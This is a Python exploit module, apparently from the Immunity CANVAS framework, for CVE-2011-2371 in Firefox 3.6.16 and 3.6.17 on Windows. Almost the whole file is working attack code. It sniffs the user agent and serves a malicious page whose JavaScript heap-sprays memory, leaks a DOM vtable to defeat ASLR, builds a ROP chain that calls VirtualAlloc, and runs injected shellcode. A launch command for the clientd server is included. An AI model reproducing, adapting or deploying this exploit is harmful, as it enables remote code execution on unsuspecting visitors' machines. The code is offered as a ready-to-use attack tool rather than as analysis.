#! /usr/bin/env python

# CANVAS Exploit
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2011
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import hashlib
import random

from exploitutils import *
from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser

NAME                           = "Firefox Array reduceRight"
DESCRIPTION                    = "Client-Side vulnerability in Mozilla Firefox before 3.6.18"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION['CVE Name']      = 'CVE-2011-2371'
DOCUMENTATION['CVE URL']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2371'
VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Clientside"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "XP", "Vista", "7"]
PROPERTY['MFSA']               = 'http://www.mozilla.org/security/announce/2011/mfsa2011-22.html'
PROPERTY['VENDOR']             = 'Mozilla'

NOTES = """
Run from clientd without using js_recon module to improve reliability:
python ./exploits/clientd/clientd.py -l 192.168.1.21 -d 5555 -O server_port:8080 -O allowed_attack_modules:firefox_array_reduceright -O auto_detect_exploits:0

Bypasses ASLR using an infoleak that reads a DOM element vtable.
ROP chain based on xul.dll versions 1.9.2.16 & 1.9.2.17 (which are used in FF 3.6.16 & 3.6.17)

Tested on Windows XP SP3 and Windows 7 SP1 both 32bits
"""

CHANGELOG = """
"""

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "Firefox", "")]
        self.plugin_info = None # we want clientd to give us a plugin dict
        self.supports_dns_mosdef = False
        self.shellcode = "\xcc" * 298
        self.setVersions()
        self.version = 1
        self.badstring = ""
        self.name = NAME 
        self.filename = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")


    def random_dummy_string(self, prefix=""):
        h = hashlib.new('sha1')
        h.update(str(random.random() * 10).replace('.', ''))
        retval = h.hexdigest()
        retval = '%s%.5s' % (prefix, retval)
        return retval
    
    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if 'Windows' in parsed['os']['family'] and \
           parsed['user_agent']['family'] == 'Firefox' and \
           parsed['user_agent']['major'] == '3' and \
           parsed['user_agent']['minor'] == '6' and \
           parsed['user_agent']['patch'] in ('16', '17'):
            return 100

        self.log("Did not detect vulnerable version of Firefox - bailing out.")
        return 0

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s" % (v, self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1] = ("Windows - all versions", None)

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
    
    def makefile(self):
        replaces = {}
        replaces["[SHELLCODE]"] = urluencode(self.shellcode)
        
        filedata = """
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <title>Array.reduceRight</title>
    </head>
    <body>
        
        <script type="application/javascript">
        """
        
        js = """
            var sprayed_chunks 		= [];			
            var dom_elements_array 	= new Array();
            var fake_strings_base 	= 0x0E000014; // a fake str block will be here 
            var fake_strings_size 	= 0x00800000;
            //var dom_leak_address 	= 0x12200074; // start address to search for our tags and dom objs.
            var dom_leak_addresses	= [0x12200074, 0x04900074, 0x08200074] // to search in 3 diff places
            var shellcode_base 		= 0x18000014; // a shellcode sprayed block will be here
            var search_tags			= [0x66666666, 0x77777777, 0x11112222];			
            var search_str_tag 		= String.fromCharCode(0x6666) + String.fromCharCode(0x6666) + String.fromCharCode(0x7777) + String.fromCharCode(0x7777);
            var vtable_found		= false;
            var dom_vtable_address	= 0;
            var xul_version         = null;            
            var virtualalloc_ptr    = 0;
            var gadget_1		    = 0;
            var gadget_2	        = 0;
            var gadget_3	    	= 0;
            var gadget_4    		= 0;
            var gadget_5    		= 0;
            var gadget_6    		= 0;
            var gadget_7    		= 0;
            var gadget_8    		= 0;
            var gadget_9            = 0;
            
            reduceCallbackExploit = function(prev, current, index, array) {				
                var o = current[0];
                throw "<STOP REDUCECALLBACK>"; // just in case
            }
            
            reduceCallbackLeak = function(prev, current, index, array) {					
                var offset = 0;
                var vtable_low = 0;
                if (xul_version == "1.9.2.16") {
                    vtable_low = 0x000017B0;
                }
                else {
                    if (xul_version == "1.9.2.17") {
                        vtable_low = 0x0000C3E8;
                    }
                }
                while (true) {
                    var index = current.indexOf(search_str_tag, offset);
                    if (index != -1) {
                        var s1 = current.substr(index, 8);					
                        var leaked_info = [];
                        for(var i=0; i < s1.length; i+=2) {
                            high = new Number(s1.charCodeAt(i+1)); 
                            low = new Number(s1.charCodeAt(i)); 
                            data = (high << 16) + low;
                            leaked_info.push(data);
                        }
                        // To find our DOM obj we search for two tags and make sure is NOT followd by the third search tag.
                        // Also we make sure that the value that is supposed to be the vtable is greater than 0x20000000 because
                        // sometimes we may get other kind of values there
                        if ( leaked_info[0] == search_tags[0] &&
                             leaked_info[1] == search_tags[1] &&
                             leaked_info[2] != search_tags[2] ) {
                            if ((leaked_info[3] & 0x0000FFFF) == vtable_low) {							
                                vtable_found = true; 
                                dom_vtable_address = leaked_info[3];
                                throw "<STOP REDUCECALLBACK>"; // exit
                            }
                            else {                            
                                offset = index+160;
                            }
                        }
                        else {
                            // if we find the tags but not the vtable we keep searching adding to the offset
                            offset = index+7950;
                        }
                    }
                    else {						
                        throw "<STOP REDUCECALLBACK>"; // this is to stop reduceRight from keep calling the callback for other elements in the array
                    }
                }
            }
        
        
            function trigger(address, explotar) {				
                var boom = new Array();	
                // do some math to set the appropiate length to the array to access the given address
                value = address / 4 + 0x80000001;
                // For FF4 length value = ( (address - EAX) / 8 ) + 0x80000000 but EAX value is not fixed..
                boom.length = value;				
                try {
                    if (explotar)
                        boom.reduceRight(reduceCallbackExploit,0,0,0);
                    else
                        boom.reduceRight(reduceCallbackLeak,0,0,0);
                }
                catch(ex){					
                    // an empty catch to get all the stop reduce exceptions we throw
                }
            }
        
            function str_hexa_pad4(str) {
                while (str.length < 4)
                    str = "0" + str;
                return str.toUpperCase();
            }
        
            function str_hexa_pad(str) {
                while (str.length < 8)
                    str = "0" + str;			
                return "0x" + str.toUpperCase();
            }
            
            function str_hexa(val)
            {
                var str = new Number(val).toString(16);
                return str_hexa_pad(str);
            }
            
            function hexa(val)			
            {
                var str = new Number(val).toString(16);
                return str_hexa_pad4(str);
            }
        
            function myescape(addr) {
                var str = "";
                str = "%u" + hexa(addr & 0xffff) + "%u" + hexa((addr >> 16) & 0xffff);
                return unescape(str);
            }
            
            function create_fake_strings_block(block_size) {				
                var str_block = "";
                str_block += unescape("%uAAAA"); 				// padding to align
                
                for(var i=0; i < dom_leak_addresses.length; i++) { 
                    str_block += myescape(fake_strings_base + 0x8 + 0x10*i); 	// fake_strings_base points to this 
                                                                    // It contians an address that ends with C so when using the mask to check the tagged js obj with 0x4 it interprets it as a valid string
                    str_block += myescape(fake_strings_size); 		// fake string size to be able to read alot
                    str_block += myescape(dom_leak_addresses[i]); 	// ptr to address I want to read (this is the fake str)
                    str_block += myescape(0x12345678); 				//padding to create another fake str
                }
                
                while(str_block.length < block_size - 10){
                        str_block+=unescape("%uCCCC%u9090"); // this could be random...
                }
                return str_block;
            }
            
            function create_dummy_str_block(block_size) {				
                var str_block = "";
                //str_block += unescape("%uAAAA"); 
                for(var j=0; j < 17; j++) { // some padding to place our search tags
                    str_block += myescape(0xBADF00D0 + j);
                }
                // these 2 dwords are used as tags to search our dom objects to get a vtable
                str_block += myescape(search_tags[0]);
                str_block += myescape(search_tags[1]);
                
                while(str_block.length < block_size) {						
                        str_block += myescape(search_tags[2]); 
                }
                return str_block;
            }
            
            function create_shellcode_block(block_size) {
                // rop chain needed based on xul.dll
                var block = "";				
        
               // set things to make a call to our stack pivot
                block += unescape("%uAAAA") 				// padding to align				
                block += myescape(shellcode_base+0x4); 		// shellcode_base points here
                block += myescape(shellcode_base+0xC);
            
                block += myescape(gadget_2); 				// Gadget 2 - POP EAX; RET to load VirtualAlloc address				
                block += myescape(shellcode_base+0x4C); 	// there must be 1 dword after the addres where this value points and then the first rop gadget
                block += myescape(virtualalloc_ptr);       	// ESP points here after gadget 1
                block += myescape(gadget_3); 				// Gadget 3 - MOV EAX, [EAX]; RET 
                block += myescape(gadget_4); 				// Gadget 4 - CALL EAX; RET				
                                                            // Parameters for virtualalloc
                block += myescape(0x0);               		// NULL
                block += myescape(0x10000);           		// size
                block += myescape(0x3000);            		// MEM_COMMIT | MEM_RESERVE
                block += myescape(0x40);              		// PAGE_EXECUTE_READWRITE				
                block += myescape(gadget_5);				// Gadget 5 - XCHG EDI,EAX; RET	
                
                block += myescape(gadget_6);        		// Gadget 6 - set eax = edi ; set esi = shellcode -  MOV EAX,EDI; POP ESI; RETN
                block += myescape(shellcode_base+0x5C);    	// Address where shellcode is
                
                block += myescape(gadget_7);          		// Gadget 7 - ecx = sizeof(shellcode) - POP ECX, RET
                block += myescape(0x1000);            		// sizeof(shellcode)
                block += myescape(gadget_8);          		// Gagdet 8 -  memcpy - REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]
                block += myescape(0x11112222);        		// dummy
                block += myescape(0x33334444);        		// dummy
                block += myescape(gadget_9);          		// Gadget 9 - jmp to shellcode - JMP EAX
                
                block += myescape(0x55556666);  	 		// this will be shellcode_base+0x4C
                block += myescape(dom_vtable_address);
                // this addr right below will be in ECX and js3250!js_Interpret+0x48cf -> call ecx will use it to begin our RCE
                block += myescape(gadget_1); 				// Gadget 1 - Stack pivot - this content will be put in 0 by this very same gadget
                                                            // 104CC407   56               PUSH ESI
                                                            // 104CC408   5C               POP ESP
                                                            // 104CC409   8366 44 00       AND DWORD PTR DS:[ESI+44],0
                                                            // 104CC40D   33C0             XOR EAX,EAX
                                                            // 104CC40F   5E               POP ESI
                                                            // 104CC410   C2 0400          RETN 4
                
                // the vtable we are leaking is this one
                // const nsHTMLTextAreaElement::`vftable'{for `nsGenericHTMLElement'} dd offset nsHTMLTextAreaElement::QueryInterface(nsID const &,void * *)
                
                var shellcode = unescape("[SHELLCODE]");
                block += shellcode;
                
                while(block.length < block_size - 10){
                    block+=unescape("%uCCCC%u9090"); // this could be random
                }
                return block;
            }
        
            function spray_str(str, quant){		
                var t = new Array();
                for(var i=0; i < quant; i++){					
                    t[i] += str;
                }		
                return t;
            }
        
            function do_shellcode_spray() {
                setup_gadgets();
                var spray = create_shellcode_block(0x7FFFF);
                sprayed_chunks.push(spray_str(spray,0x90));				
            }
            
            function do_fake_strings_spray() {
                // we want to leak the contents of the dom_leak_address address that will give us a vtable
                var spray = create_fake_strings_block(0x7FFFF); 
                sprayed_chunks.push(spray_str(spray,0x80));
            }
            
            function do_dummy_str_spray() {
                var spray = create_dummy_str_block(0x40);
                sprayed_chunks.push(spray_str(spray,1));
            }
            
            function do_textarea_spray() {				
                for(var a=0; a < 0x3000; a++) {
                    var e = document.createElement("textarea");
                    dom_elements_array[a] = e;
                    do_dummy_str_spray(); // this will put a mark between our dom objects and we'll use it to find the vtable
                }
            }
            
            function is_vulnerable() {
                var ua = navigator.userAgent;
                var ffregex = /Firefox\/3.6.1(6|7)/i;
                var xulregex = /; rv:(.*)\) /i;
                m = ffregex.exec(ua);
                if (m.length > 0) {
                    m = xulregex.exec(ua);
                    if (m.length > 1) {
                        xul_version = m[1];
                        return true;
                    }
                }
                return false;
            }
            
            function setup_gadgets() {
                if (xul_version == "1.9.2.16") {
                    virtualalloc_ptr = dom_vtable_address-0x1A9524;
                    gadget_1		 = dom_vtable_address-0x51F0C0;
                    gadget_2		 = dom_vtable_address-0x9DEDDB;
                    gadget_3		 = dom_vtable_address-0x9DD6A2;
                    gadget_4		 = dom_vtable_address-0x8DF1BD;
                    gadget_5		 = dom_vtable_address-0x9BF3F4;
                    gadget_6		 = dom_vtable_address-0x9C9CCF;
                    gadget_7		 = dom_vtable_address-0x9E063D;
                    gadget_8		 = dom_vtable_address-0x9DF973;
                    gadget_9		 = dom_vtable_address-0x9DD304;
                }
                else {
                    if (xul_version == "1.9.2.17") {
                        virtualalloc_ptr = dom_vtable_address-0x1A6164;
                        gadget_1		 = dom_vtable_address-0x51FFE1;
                        gadget_2		 = dom_vtable_address-0x9E9A72;
                        gadget_3		 = dom_vtable_address-0x9E890C;
                        gadget_4		 = dom_vtable_address-0x8D7FA5;
                        gadget_5		 = dom_vtable_address-0x8AE69F;
                        gadget_6		 = dom_vtable_address-0x9D273F;
                        gadget_7		 = dom_vtable_address-0x9EB35B;
                        gadget_8		 = dom_vtable_address-0x9EA2C1;
                        gadget_9		 = dom_vtable_address-0x98F16E;
                    }
                    else {
                        throw "Browser not supported";
                    }
                }
                
            }
            
            function search_vtable() {
                var x = 0;
                while ( (x < dom_leak_addresses.length) && (!vtable_found) ) {
                    trigger(fake_strings_base + 0x10*x, false);
                    x++;
                }
            }
            
            function Exploit()
            {					
                if (is_vulnerable()) {
                    do_fake_strings_spray(); 			// some strings to read with the leak
                    do_textarea_spray(); 				// some DOM objects to get their vtable ref
                    search_vtable();
                    if (vtable_found) {
                        do_shellcode_spray();
                        trigger(shellcode_base, true);	// trigger the RCE
                    }
                    else {
                        document.write("Failed...");
                    }
                }
                else {
                    document.write("Browser not supported");
                }
            }	

            setTimeout("Exploit();", 1000);
            """
        
        for k,v in replaces.iteritems():
            js = js.replace(k,v)
        
        #filedata += self.jsObfuscator.obfuscate(js)
        filedata+=js
        
        filedata += """
        </script>
    </body>
</html>"""        
    
        return filedata
    
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        
        h = header("SERVER")
        b = body()
        self.log("Request: " + clientheader.URL)
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log("sending HTML")
            self.createShellcode()
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Set-Cookie', 'SessionID=%d' % self.jsObfuscator.getXORKey())
            h.addHeader("Content-Type", "text/html")
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status = "302"
            h.addHeader("Location", self.filename)
            h.addHeader("Content-Type", "text/html")

        return h, b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
